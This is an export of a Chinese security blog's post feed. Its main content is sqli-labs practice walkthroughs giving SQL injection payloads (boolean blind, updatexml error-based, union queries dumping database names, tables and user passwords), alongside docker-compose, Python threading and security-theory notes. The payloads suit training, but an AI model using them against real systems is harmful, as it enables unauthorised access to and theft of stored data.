title="基于布尔的盲注"></a>基于布尔的盲注</h3></li></ul><ul><li><p>在布尔盲注中，正确会有回显，错误没有，以此逐字爆破</p></li><li><p>爆数据库名payload</p><pre><code class="hljs mysql">left((select database()),1) &#x3D; &#39;s&#39; --+ # 查询当前数据库名的第一个字符是否等于s，正确则等号后的值正确的话会有回显left((select database()),2) &#x3D; &#39;se&#39; --+ # 在第一个字符的基础上继续爆破第二个字符后续的字符同上依次递增</code></pre></li></ul><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=1&#39;</a> and left((select database()),1) = ‘s’ –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814184105.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><h3 id="concat聚合函数"><a href="#concat聚合函数" class="headerlink" title="concat聚合函数"></a>concat聚合函数</h3></li></ul><ul><li><p>使用coucat函数如果分组语句，会把查询的一部分以错误的形式显示出来</p><pre><code class="hljs mysql">and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ # 将数据库名以报错的方式回显and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema &#x3D; database() limit%20 3,1),0x7e),1) --+ # 查询当前数据库下的表名，一次只能返回一个结果，需要多次替换limit n，1 来实现遍历表名</code></pre></li></ul><table><thead><tr><th>192.168.5.135/sqli/Less-5/?id=1’ and updatexml(1,concat(0x7e,(select ),0x7e),1) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815104502.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td><a href="http://192.168.5.135/sqli/Less-5/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=-1&#39;</a> and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema = database() limit%20 3,1),0x7e),1) –+</td></tr><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815110426.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><ul><li><p>less5与less6的区别在id参数传到服务器时对id参数进行了处理，从源代码可以看到查询语句为</p><pre><code class="hljs mysql">$id&#x3D;&#39;&quot;&#39;.$id.&#39;&quot;&#39;; $sql&#x3D;&quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT0,1&quot;;</code></pre></li><li><p>那么这一关的通关策略和less5一样，只需要将‘变成“即可，这里只记录一个payload</p><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-6/?id=1&quot;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-6/?id=1&quot;</a> and left(version(),1) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815115503.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>盲注这个东西，难度相对于其他类型的注入来说挺大的，确实复杂，而且各个类型以及骚操作都很多。</li><li>掌握常用的盲注函数以及能够构造简单的payload就差不多了。（主要是复杂的构造不出来……）</li><li>如果能够证明有盲注的存在，那么sqlmap一把嗦不香吗</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决firefox复制url会自动encodeurl</title>
    <link href="/2020/07/31/%E8%A7%A3%E5%86%B3firefox_%E5%A4%8D%E5%88%B6url_%E4%BC%9A%E8%87%AA%E5%8A%A8encodeurl/"/>
    <url>/2020/07/31/%E8%A7%A3%E5%86%B3firefox_%E5%A4%8D%E5%88%B6url_%E4%BC%9A%E8%87%AA%E5%8A%A8encodeurl/</url>
    
    <content type="html"><![CDATA[<h1 id="解决firefox-复制url-会自动encodeurl"><a href="#解决firefox-复制url-会自动encodeurl" class="headerlink" title="解决firefox 复制url 会自动encodeurl"></a>解决firefox 复制url 会自动encodeurl</h1><ul><li><p>问题记录：复制url之后会默认将明文encodeurl</p><ul><li>明文地址：<a href="http://192.168.5.135/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=-1&#39;</a> or 1=1 –+</li><li>经过encodeurl后的地址：<a href="http://192.168.5.135/sqli/Less-1/?id=1%27%20!%20=" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=1%27%20!%20=</a></li></ul></li><li><p>解决方法：</p><ul><li><p>firefox 地址栏输入about:config进入浏览器配置界面，接受风险并继续</p><p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814105934.png" srcset="/img/loading.gif" alt=""></p></li><li><p>搜索<code>browser.urlbar.decodeURLsOnCopy</code> 点右侧按钮将false 切切换为true即解决</p><p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814110048.png" srcset="/img/loading.gif" alt=""></p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firefox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less1-4</title>
    <link href="/2020/07/30/sqli-less1-4/"/>
    <url>/2020/07/30/sqli-less1-4/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-less-1-4"><a href="#sqli-less-1-4" class="headerlink" title="sqli less 1-4"></a>sqli less 1-4</h1><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><ul><li><p>直接在url后添加了‘号触发报错，效果如图</p><table><thead><tr><th><a href="http://172.18.9.66/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://172.18.9.66/sqli/Less-1/?id=1&#39;</a></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727134051.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>从上述错误中，可以看到1’经过sql语句构造后形成<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code> 多出了个单引号，从错误中得到想要的信息后，通过<code>&#39;or 1=1 --+</code>注释将多余的’去掉</p></li><li><p>构造的sql语句应该如下表格中显示的一致,提交后正常返回数据</p><table><thead><tr><th>select * from users where id=’1’ or 1=1 –+’ limit 0,1</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727134851.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>此处可以用order by对数据进行排列，超过一定列数会报错，可以利用这一机制探测列数</p><ul><li>这里只能用order by 3 ，超过order by3 就会报错</li><li><code>&#39;order by 4--+</code>的结果显示超出</li></ul><table><thead><tr><th><a href="http://172.18.9.66/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://172.18.9.66/sqli/Less-1/?id=1&#39;</a> order by 4 –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727135418.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>分析源码为什么会造成sql注入，查询的sql语句如下</p><table><thead><tr><th>select * from users where id=’$id’ limit 0,1;</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727135610.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>id 在拼接sql语句时，没有对id进行任何过滤，当提交<code>&#39; or 1=1 --+</code> 构造的sql语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">''</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-comment">--+ limit 0,1;</span>这条语句因 <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> 所以永恒为真</code></pre></li></ul></li><li><p>这里着重记一下union联合注入，union的作用是将两个sql语句进行联合。强调一下union前后的两个sql语句的选择列数要相同才可以。union all 和 union  的区别是增加了去重的功能。</p><ul><li><p>结合sql注入基础篇中的information_schema的知识点，对less1进行注入。</p></li><li><p>当id的数据在数据库中不存在时，可以id=-1，两个sql语句进行联合操作时，当前一个语句查询内容为空时，后面的语句内容才会显示出来，此处网页返回了构造的union数据</p></li><li><p>爆数据库 payload:</p><pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span></code></pre><table><thead><tr><th>此处sql语句为 select * from users where id =’-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata –+ limit 0,1</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814101641.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul></li></ul><ul><li><p>爆当前数据库的数据表payload:</p><pre><code class="hljs sql">http://172.18.9.66/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">"security"</span> <span class="hljs-comment">--+</span></code></pre><table><thead><tr><th>sql语句为 select * from users where id = ‘-1’ union select 1,group _concat(table_name),3 from information_schema.tables  where table_schema = “security” –+ limit 0,1</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727154802.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>爆users表的列</p><pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">"users"</span> <span class="hljs-comment">--+</span></code></pre><table><thead><tr><th>sql语句: select * from users where id=’-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name = “users” –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814103732.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>爆数据</p><pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><table><thead><tr><th>sql语句：select * from user where id = ‘-1’  union select 1,username,password from users  where id=3 –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814105002.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><ul><li>less 1-4都可以使用union联合注入，下文不重复操作了。</li></ul><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><ul><li><p>将单引号添加到id后，返回报错</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814114531.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td>You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ‘’ LIMIT 0,1’ at line 1</td></tr></tbody></table></li><li><p>执行的查询语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>  <span class="hljs-keyword">table</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-number">1</span><span class="hljs-string">'</span></code></pre><ul><li>报错多了一个单引号，所以这里的单引号破坏了查询返回了报错，查询代码应该为 id= 一个整数</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> talbe  <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-built_in">int</span></code></pre><ul><li>打开less2源代码sql查询语句如下，id没有经过处理</li></ul><pre><code class="hljs sql">$sql="<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> = $<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">";</span></code></pre><ul><li>可成功的注入为</li></ul><table><thead><tr><th>or 1= 1 –+     # 这里不加–+只用or 1=1 也可以</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814115823.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>其余的payload和less1一样，将单引号’去掉即可，不重复了。</p></li></ul><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><ul><li><p>输入单引号报错</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814120120.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at  line 1</td></tr></tbody></table><ul><li><p>从返回的报错来看，多出了一个)，那么查询语句应该为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> login_name,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> talbe <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = ($<span class="hljs-keyword">id</span>)</code></pre></li><li><p>补全),使用该代码注入<code>?id=1&#39;)--+</code>,这样一来就输出账号密码了，后续的查询也被注释了</p></li></ul><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-3/?id=1&#39;</a>) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814120617.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>可成功注入的有</p><pre><code class="hljs sql">')or'1'=('1)or1=1<span class="hljs-comment">--+</span></code></pre></li><li><p>其余payload在less1的’后加)即可</p></li></ul><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><ul><li><p>输入id=1”</p><table><thead><tr><th><img src="C:%5CUsers%5CHeBe%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200814121202249.png" srcset="/img/loading.gif" alt="image-20200814121202249"></th></tr></thead><tbody><tr><td>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at  line 1</td></tr></tbody></table><ul><li>多了一个双引号和反括号，可见这是对id参数使用了””和()进行包装</li><li>使用<code>id=1 &quot;) --+</code>进行注入，输出了账号密码，后续查询也被注释掉了</li></ul><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-4/?id=1&quot;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-4/?id=1&quot;</a>) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814121427.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>查询源代码得知查询语句为<code>$sql=&quot;SELECT*FROMusersWHEREid=(“$id”)LIMIT0,1&quot;;</code></p><ul><li>可成功注入payload</li></ul><pre><code class="hljs sql">“)or”1”=(“1“)or1=1<span class="hljs-comment">--+</span></code></pre></li><li><p>其他payload同less1，将‘替换为”)即可</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli手注基础</title>
    <link href="/2020/07/27/sqli%E6%89%8B%E6%B3%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/07/27/sqli%E6%89%8B%E6%B3%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="sql-labs-手注"><a href="#sql-labs-手注" class="headerlink" title="sql-labs 手注"></a>sql-labs 手注</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul><li>早在之前就接触过sql-labs，前两次加起来好像是过了前面十几关把，且也没有详细的做笔记。一两个月没接触，基本忘的差不多了，所以才有了这次三刷sql-labs。</li><li>靶场搭建，其实很简单改一下数配置文件数据库连接密码就行了。这里这里直接略过，不会的话移步百度。</li></ul><h2 id="sql注入基础知识"><a href="#sql注入基础知识" class="headerlink" title="sql注入基础知识"></a>sql注入基础知识</h2><ol><li><p>sql注入的分类</p><ul><li>基于服务器接受到的响应分类<ul><li>基于错误的sql注入</li><li>联合查询的类型</li><li>堆查询注入</li><li>sql盲注<ul><li>基于布尔的sql盲注</li><li>基于时间的sql盲注</li><li>基于报错的sql盲注</li></ul></li></ul></li><li>基于如何处理输入的sql注入<ul><li>字符串类型</li><li>数字类型</li></ul></li><li>基于程度和顺序的注入<ul><li>一阶注入(一阶注入指的是输入的sql语句直接对web服务产生了影响)</li><li>二阶注入(二阶则是类似存储xss，指提交的sql语句无法对web服务产生影响，但可以通过其他辅助间接触发对web的伤害)</li></ul></li><li>基于注入点的分类<ul><li>通过用户输入的表单域的注入</li><li>通过cookie的注入</li><li>通过服务器变量的注入(头部注入)</li></ul></li></ul></li><li><p>常用函数</p><ul><li>系统函数<ul><li>version()  –&gt; Mysql版本</li><li>user() –&gt; 数据库用户名</li><li>database() –&gt; 数据库名</li><li>@@datadir –&gt;数据库路径</li><li>@@version_compile_os –&gt; 操作系统版本</li></ul></li><li>字符串连接函数<ul><li>concat(str1,str2,…) 没有分隔符的连接字符串</li><li>concat_ws((separator,str1, str2) 含有分割符的连接字符串</li><li>group_concat(str1,str2)  连接一个组的所有字符串，并以逗号分隔每一条数据</li><li>上面的解释比较抽象，其实也不用了解的这么详细，只需要知道这三个函数能一次性查出信息就行了</li></ul></li></ul></li><li><p>一般用于尝试的语句</p><ul><li><p>–+ 可以用#替换，url提交过程中#号经过url编码后为%23</p><ul><li>or 1=1 –+</li><li>‘  or 1=1 –+</li><li>“  or 1=1 –+</li><li>) or 1=1 –+</li><li>‘) or 1=1 –+</li><li>“) or 1=1 –+</li><li>“)) or 1=1 –+</li></ul></li><li><p>一般的代码为:</p><pre><code class="hljs php">$id = $_GET[<span class="hljs-string">'id'</span>];$sql = <span class="hljs-string">"SELECT * FROM users WHERE id ='$id'LIMIT 0,1"</span></code></pre><ul><li>此处应该考虑两个点，一个是闭合前面的’，一个是处理后面的’，采用两种思路，闭合后面的引号或者注释点，注释采用–+或#(%23)</li></ul></li></ul></li><li><p>information_schema数据库</p><ul><li><p>information_schema数据库只有在mysql5.0以上的版本才有，该数据库中存放着其他数据库的信息，这里需要记得是里面的几个表是干嘛的就行了</p><ul><li>SCHEMATA –&gt; 存储数据库名，关键字段：SCHEMA_NAME，表示数据库名称。show databases()的结果就是取自于此。</li><li>TABLES –&gt; 存储表名，关键字段：TABLE_SCHEMA表示表所属的数据库名称;TABLE_NAME表示表的名称。</li><li>COLUMNS —-―&gt;存储字段名，关键字段：TABLE_SCHEMA表示表所属的数据库名称;TABLE_NAME表示所属的表的名称，COLUMN_NAME表示字段名。</li></ul><pre><code class="hljs sql">猜数据库<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata 猜某库的表<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=’xxxxx’ 猜某表的列<span class="hljs-keyword">Select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=’xxxxx’ 获取某列的所有内容<span class="hljs-keyword">Select</span> *** <span class="hljs-keyword">from</span> ****</code></pre></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker-compose小记</title>
    <link href="/2020/07/24/docker-compose%E5%B0%8F%E8%AE%B0/"/>
    <url>/2020/07/24/docker-compose%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="docker-compose小记"><a href="#docker-compose小记" class="headerlink" title="docker-compose小记"></a>docker-compose小记</h1><h2 id="安装-centos7环境"><a href="#安装-centos7环境" class="headerlink" title="安装(centos7环境)"></a>安装(centos7环境)</h2><ul><li><p>三种安装方式</p></li><li><p>官网安装 (有没有用不知道，bash 命令是网上抄的，但如果没有科学上网的话curl 会很慢)</p><pre><code class="hljs bash"><span class="hljs-comment"># 下载docker compose</span>sudo curl -L <span class="hljs-string">"https://github.com/docker/compose/releases/download/1.25.0/docker-compose-<span class="hljs-variable">$(uname -s)</span>-<span class="hljs-variable">$(uname -m)</span>"</span> -o /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<span class="hljs-comment"># 添加可执行权限</span>sudo chmod +x /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<span class="hljs-comment"># 将文件copy到 /usr/bin/目录下</span>sudo ln -s /usr/<span class="hljs-built_in">local</span>/bin/docker-compose /usr/bin/docker-compose<span class="hljs-comment"># 查看版本</span>docker-compose --ersion</code></pre></li><li><p>pip安装(这个要先下载pip，如果没有更换pip源的话比上一种还慢。更换pip源挺繁琐的，略过)</p><pre><code class="hljs bash">yum -y install epel-release <span class="hljs-comment">#安装python-pip 依赖包，少了这步后续都无法执行</span>yum -y install python-pippip --versionpip install --upgrade pippip install docker-compose docker-compose version</code></pre></li><li><p>离线安装(这个方式极力推荐，操作方式非常简单且便捷)</p><ul><li>访问docker-compose在github上的项目<a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">点这里跳转</a></li><li>下载当前操作系统的对应版本，这里下载的是linux64位的</li></ul><p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200724102607.png" srcset="/img/loading.gif" alt=""></p><ul><li><p>下载好之后使用rz上传到centos7，(不知道rz是什么自行搜索linux lszrz)</p><pre><code class="hljs bash">mv docker-compose-Linux-x86_64 docker-compose<span class="hljs-comment"># 重命名</span>mv docker-compose /usr/<span class="hljs-built_in">local</span>/bin/<span class="hljs-comment"># 剪切到应用目录下</span>chmod u+x docker /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<span class="hljs-comment"># 添加执行权限</span>docker-compose --version <span class="hljs-comment"># 查看版本</span></code></pre></li><li><p>完成上面的操作docker-compose算是安装好了</p></li></ul></li></ul><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre><code class="hljs bash">docker-compose ps <span class="hljs-comment">#出所有运行的容器</span>docker-compose up -d <span class="hljs-comment"># 启动容器，需要当前目录下存在docker-compose.yml或docker-compose.yaml</span>docker-compose down <span class="hljs-comment"># 停止当前以yml/yaml运行的容器</span><span class="hljs-comment"># 这里有个大坑就是，你上次运行的容器产生数据后，停止了，再次运行会是新的容器，什么数据都没有了。。。</span>docker-compose stop <span class="hljs-comment"># 就是因为上面会丢失数据，通常停止容器都是用stop -t 指定停止时间</span>docker-compose start <span class="hljs-comment"># 停止之后需要通过start 方式启动，而不是上面的up</span></code></pre><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>各个操作系统的安装docker-compose方式都不一样，找到合适自己的方法才是最好的方法</li><li>使用docker-compose时需要启动docker，没有事先安装docker的话docker-compose时无法使用的</li><li>在启动docker-compose的时候，加载很慢的话那就需要考虑一下使用镜像加速了。具体方法搜索docker镜像加速。</li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker-compose</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_threading乱序问题</title>
    <link href="/2020/07/18/python-threading%E4%B9%B1%E5%BA%8F%E9%97%AE%E9%A2%98/"/>
    <url>/2020/07/18/python-threading%E4%B9%B1%E5%BA%8F%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="python-threading-随笔"><a href="#python-threading-随笔" class="headerlink" title="python threading 随笔"></a>python threading 随笔</h1><h3 id="Semaphore类"><a href="#Semaphore类" class="headerlink" title="Semaphore类"></a>Semaphore类</h3><ul><li><p>写程序多线程执行的时候，经常碰到一个问题就是线程乱序，一直抱着又不是不能用的心理所以放着没解决。今天恰好又碰到了，索性就把这个问题处理了</p></li><li><p>Semaphore是python 内置模块threading中的一个类</p></li><li><p>Semaphore管理着一个计数器，计数器的值默认为1，值不能小于0，计数器的值为0时，调用acquire()的线程就会堵塞。</p><ul><li>每调用一次acquire()方法，计数器减一</li><li>调用一次release()方法，计数器加一</li><li>因此可以利用Semaphore这个类的特征来控制线程数量</li></ul></li><li><p>demo</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(a)</span>:</span>    print(t.name)  <span class="hljs-comment"># 输出线程的名字</span>    print(a)    time.sleep(<span class="hljs-number">1</span>)    sem.release()  <span class="hljs-comment"># 释放 semaphore</span>sem = Semaphore(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 设置计数器的值为 5</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):    sem.acquire()  <span class="hljs-comment"># 获取一个 semaphore</span>    t = Thread(target=func, args=(i,))    t.start()<span class="hljs-comment"># 当执行两次acquire()方法后,sem中的值为零，线程开始堵塞，func需要延迟一秒才执行结束。</span><span class="hljs-comment"># func执行一次release()，sem的值开始+1，for循环又可以继续执行了</span></code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>threading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信安理论</title>
    <link href="/2020/07/16/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/07/16/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="信息安全基础"><a href="#信息安全基础" class="headerlink" title="信息安全基础"></a>信息安全基础</h1><ol><li><p>信息安全概念：保护信息系统的硬件，软件及相关数据，使之不因为偶然或而已的侵犯而遭受到破坏，更改和泄露；保证信息系统中的机密性，完整性，和可用性</p></li><li><p><strong>信息安全管理体系</strong>：是组织在整体或特定范围内建立的信息安全方针和目标，以及完善这些目标所采用的方法和手段所构成的体系</p><ol><li>信息安全管理体系<ul><li>密码管理</li><li>网络管理</li><li>设备管理</li><li>人员管理</li></ul></li><li>密码管理<ul><li>密码管理：基于密码机制的安全系统</li><li>商用密码管理原则：统一领导，集中管理，定点研制，专控经营，满足使用。</li><li>商用密码应用：不涉及国家秘密内容但又具有敏感性的内部信息，行政事务信息，经济信息等进行加密保护</li><li>无线局域网产品使用系列密码算法：<ul><li>对称密码算法：SMS4</li><li>签名算法：ECDSA</li><li>密钥协商算法：ECDH</li><li>杂凑算法：SHA-256</li><li>随机数生成算法：自行选择</li></ul></li></ul></li><li>网络管理<ul><li>网络管理：配置管理，性能管理，安全管理，故障管理等。<ul><li>网络管理体系结构包括：协议，表示，安全，对象</li><li>网络管理特征：统一化，智能化，安全化，主动化</li></ul></li><li>设备管理<ul><li>包括设备的选型，检测，安装，登记，使用，维护和存储管理等。</li></ul></li><li>安全设备选取原则：<ul><li>严禁使用未经国家信息安全评测机构认可的信息安全产品</li><li>尽量避免直接使用境外的密码设备，必须采用境外的信息安全产品时，该产品需通过国家信息安全测评机构的认可</li><li>眼睛使用未经国家密码管理部门批准和未通过国家信息安全质量认证的密码设备</li></ul></li><li>人员管理<ul><li>确保有关业务人员的思想素质，职业道德，和业务素质</li><li>人员管理的安全教育对象：包括信息安全相关的所有人员</li></ul></li></ul></li><li>信息安全等级保护1.0(GB17859-1999)<ul><li>等级保护划分依据：信息系统的安全保护等级应对根据信息系统在国家安全，经济建设，社会生活中的重要程度，信息系统遭到破坏后对国家安全，社会秩序，公共利益以及公民，法人和其他组织的合法权益的危害程度等因素</li><li>信息安全等级保护<ol><li>用户自主保护级：隔离用户与数据</li><li>系统审计保护级：在自主访问控制的基础上控制访问权限扩散。</li><li>安全标记级：具有系统审计保护级所有的功能，提供有关安全策略模型，数据标记，具备准确地标记输出信息的能力，消除通过测试发现的任何错误。</li><li>结构化保护级：在安全标记级实施的自主和强制访问控制基础上，进一步扩展到所有的主体和客体，能够审计利用隐蔽存储信道时可能被使用的事件。</li><li>访问验证保护级：满足访问监视器需求，访问监视器仲裁主体对客体的全部访问</li></ol></li><li>涉密信息系统安全分级保护根据其涉密信息系统处理的最高密级，可以划分为秘密级，机密级和机密(增强)级，绝密级。</li><li>分类保护<ul><li>秘密级：包含有最高为秘密级的国家秘密，其防护水平不低于